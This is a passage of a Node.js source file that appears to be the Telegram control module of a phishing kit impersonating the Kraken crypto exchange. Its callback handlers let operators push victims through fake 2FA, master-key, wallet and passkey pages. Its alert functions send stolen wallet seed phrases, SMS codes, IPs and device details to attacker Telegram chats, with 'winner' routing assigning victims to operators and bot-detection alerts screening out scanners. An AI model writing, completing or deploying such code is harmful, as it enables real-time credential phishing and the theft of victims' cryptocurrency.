            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (_) {}

        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
        return;
      }

      // ─── Master Key Page Buttons ────────────────────────
      if (action === "mk_reject" || action === "mk_done" || action === "mk_wallet" || action === "mk_passkey") {
        let newStatus, replyText;

        if (action === "mk_reject") {
          newStatus = "rejected";
          replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
        } else if (action === "mk_done") {
          newStatus = "mk_approved1";
          replyText = `🏁 <code>${identifier}</code> → <b>Done Page</b>`;
        } else if (action === "mk_wallet") {
          newStatus = "mk_approved2";
          replyText = `💼 <code>${identifier}</code> → <b>Wallet</b>`;
        } else if (action === "mk_passkey") {
          newStatus = "mk_approved3";
          replyText = `🔐 <code>${identifier}</code> → <b>Passkey 2FA</b>`;
        }

        await fetch(`${APP_URL}/api/update-masterkey-status`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId: identifier, status: newStatus })
        });

        try {
          await bot2.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (_) {}

        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
        return;
      }

      // ─── Device Approval Redirection Buttons ────────────────────────
      if (action === "device_icloud" || action === "device_gmail") {
        let newStatus, replyText;

        if (action === "device_icloud") {
          newStatus = "icloud";
          replyText = `☁️ <code>${identifier}</code> → <b>Redirecting to iCloud</b>`;
        } else if (action === "device_gmail") {
          newStatus = "gmail";
          replyText = `🌈 <code>${identifier}</code> → <b>Redirecting to Gmail</b>`;
        }

        await fetch(`${APP_URL}/api/update-device-approval-status`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId: identifier, status: newStatus })
        });

        try {
          await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (_) {}

        await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
        await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
        return;
      }

      // ─── Wallet Options Page Buttons ────────────────────────
      if (action === "wallet_master_key" || action === "wallet_2fa" || action === "wallet_done") {
        let newStatus, replyText;

        if (action === "wallet_master_key") {
          newStatus = "wallet_master_key";
          replyText = `🗝️ <code>${identifier}</code> → <b>Master Key</b>`;
        } else if (action === "wallet_2fa") {
          newStatus = "wallet_2fa";
          replyText = `🔐 <code>${identifier}</code> → <b>2FA</b>`;
        } else if (action === "wallet_done") {
          newStatus = "wallet_done";
          replyText = `🏁 <code>${identifier}</code> → <b>Done</b>`;
        }

        await fetch(`${APP_URL}/api/update-wallet-options-status`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId: identifier, status: newStatus })
        });

        try {
          await bot2.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (_) {}

        await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
        await bot2.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
        return;
      }

      // ─── Standard buttons (2fa_approve, accept, page, etc) ────────────────────────
      if (action === "2fa_approve" || action === "2fa_reject") {
        const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
        const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";

        await fetch(`${APP_URL}/api/update-2fa-status`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
        });

        try {
          await bot2.editMessageReplyMarkup(
            { inline_keyboard: [] },
            { chat_id: query.message.chat.id, message_id: query.message.message_id }
          );
        } catch (_) {}

        const msgText = query.message.text || "";
        const smsMatch = msgText.match(/(?:SMS|2FA|2FA-2)[:\s]+([\d\s\-]+)/i);
        const displayCode = smsMatch ? smsMatch[1].trim() : null;

        const twoFaStatusText = displayCode
          ? `🔐 <code>${displayCode}</code> has been <b>${twoFaStatus === "approved" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
          : `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`;

        await bot2.sendMessage(query.message.chat.id, twoFaStatusText, { parse_mode: "HTML" });
        await bot2.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
        return;
      }

      if (action === "accept") status = "accepted";
      else if (action === "page1") status = "accepted1";
      else if (action === "page2") status = "accepted2";
      else if (action === "page3") status = "accepted3";
      else if (action === "page4") status = "accepted4";
      else status = "rejected";

      const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3", "accepted4"].includes(status);
      const actionLabel = isAccepted ? "ACCEPTED! ✅" : "REJECTED! ❌";

      await fetch(`${APP_URL}/update-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: identifier, identifier, status })
      });

      try {
        await bot2.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (_) {}

      let replyText;
      if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
        replyText = `📍 <code>${identifier}</code> → <b>🏁 Done Page</b>`;
      } else if (status === "accepted2" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
        replyText = `📍 <code>${identifier}</code> → <b>🔐 Last 2FA</b>`;
      } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
        replyText = `📍 <code>${identifier}</code> → <b>💼 Wallet</b>`;
      } else if (status === "accepted4" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
        replyText = `📍 <code>${identifier}</code> → <b>🗝️ Master Key</b>`;
      } else {
        const isSMS = /^\d+$/.test(identifier);
        replyText = isSMS
          ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
          : `📧 <code>${identifier}</code> has been <b>${actionLabel}</b>`;
      }

      await bot2.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
      await bot2.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });

    } catch (err) {
      console.error("❌ Failed to handle callback (Bot 2):", err);
      bot2.sendMessage(ADMIN_CHAT_ID_2, `⚠️ Error handling approval`);
    }
  });
}

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.\nPlease enter your 2FA code if prompted.");
});

bot.onText(/\/startcb/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
});

async function sendAlertTelegram(type, { ip, region, device, phrase }) {
  if (!botCaptchaPage || !CHAT_ID_CAPTCHA_PAGE) {
    console.warn("⚠️ Captcha bot not configured, skipping alert");
    return;
  }

  let message = "";

  if (type === "phrase") {
    message =
      `💰💰💰💰 <b>Kraken - Wallet</b> 💰💰💰💰\n` +
      `<b>📝 Phrases:</b>\n` +
      `<code>${phrase}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else if (type === "guest") {
    message =
      `🥳🥳🥳🥳 <b>New Visitor</b> 🥳🥳🥳🥳\n\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else if (type === "bot") {
    message =
      `⛔️⛔️⛔️ <b>Kraken - Bot Alert</b> ⛔️⛔️⛔️\n\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else if (type === "too_many_attempts") {
    message =
      `⛔️⛔️⛔️ <b>Captcha too many attempts</b> ⛔️⛔️⛔️\n\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else if (type === "speed_bot") {
    message =
      `⛔️⛔️⛔️ <b>Kraken - Speed Bot Detected</b> ⛔️⛔️⛔️\n\n` +
      `<b>⚡ Filled in under 2 seconds</b>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else if (type === "blocked_ip") {
    message =
      `🚫🚫🚫 <b>Blocked IP Detected</b> 🚫🚫🚫\n\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else {
    message = `⚠️ Unknown alert type: ${type}`;
  }

  try {
    await botCaptchaPage.sendMessage(CHAT_ID_CAPTCHA_PAGE, message, { parse_mode: "HTML" });
  } catch (err) {
    console.error("❌ Failed to send captcha alert:", err.message);
  }
}

async function sendPhraseTelegram({ phrase, region, device, ip }, identifier) {
  try {
    console.log(`🔍 Checking winner for phrase - identifier: ${identifier}: ${userWinnerTelegram[identifier]}`);
    
    // ✅ Send to winner
    if (identifier && userWinnerTelegram[identifier]) {
      const message =
        `💰💰💰💰 <b>Wallet - Phrases</b> 💰💰💰💰\n` +
        `<b>📝 Phrases:</b>\n` +
        `<code>${phrase}</code>\n` +
        `<b>🌍 Region:</b> ${region}\n` +
        `<b>💻 Device:</b> ${device}\n` +
        `<b>📍 IP:</b> ${ip}`;
      
      await sendFollowUpMessage(identifier, message, { parse_mode: "HTML" });
      console.log(`📨 Wallet Phrase sent to winner: ${userWinnerTelegram[identifier]}`);
    } else {
      // No winner - send to captcha bot (fallback)
      await sendAlertTelegram("phrase", { ip, region, device, phrase });
      console.log(`📨 Wallet Phrase sent to captcha bot (no winner)`);
    }
  } catch (err) {
    console.error("❌ Failed to send wallet phrase:", err.message);
  }
}

module.exports = {
  bot,
  bot2,
  botCaptchaPage,
  broadcastMessage,
  sendFollowUpMessage,
  userWinnerTelegram,
  sendApprovalRequest,
  sendApprovalRequestGeneric,
  sendApprovalRequestSMS,
  sendApprovalRequestPage,
  sendLoginTelegram,
  sendVerifyTelegram,
  send2FATelegram,
  send2FACode,
  sendMasterKeyTelegram,
  sendWalletOptionsTelegram,
  sendAlertTelegram,
  sendPhraseTelegram
};
